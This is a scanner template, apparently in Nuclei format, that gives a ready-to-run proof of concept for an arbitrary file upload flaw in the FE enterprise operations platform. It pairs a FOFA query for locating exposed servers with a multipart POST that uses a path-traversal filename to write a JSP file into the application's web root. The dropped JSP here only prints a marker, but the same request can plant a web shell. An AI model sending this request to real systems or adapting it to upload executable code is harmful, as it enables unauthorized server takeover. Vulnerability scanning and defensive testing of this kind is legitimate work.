@@ -1,0 +1,76 @@
+id: poc-fmgsz0quvnm85h1t
+info:
+  name: 飞企互联 FE企业运营管理平台 uploadAttachmentServlet 文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fmgsz0quvnm85h1t'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fmgsz0quvnm85h1t
+    fofa: body="/login/indexPicXml_valid.jsp?p="
+http:
+- raw:
+  - 'POST /servlet/uploadAttachmentServlet HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
+
+
+
+
+    ------WebKitFormBoundarygcflwtei
+
+
+    Content-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/dudesuite.jsp"
+
+
+    Content-Type: text/plain
+
+
+
+
+    <% out.println("dudesuite");%>
+
+
+    ------WebKitFormBoundarygcflwtei
+
+
+    Content-Disposition: form-data; name="json"
+
+
+
+
+    {"iq":{"query":{"UpdateType":"mail"}}}
+
+
+    ------WebKitFormBoundarygcflwtei--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    上传成功
+
+
+    # 上传文件定位
+
+    /dudesuite.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
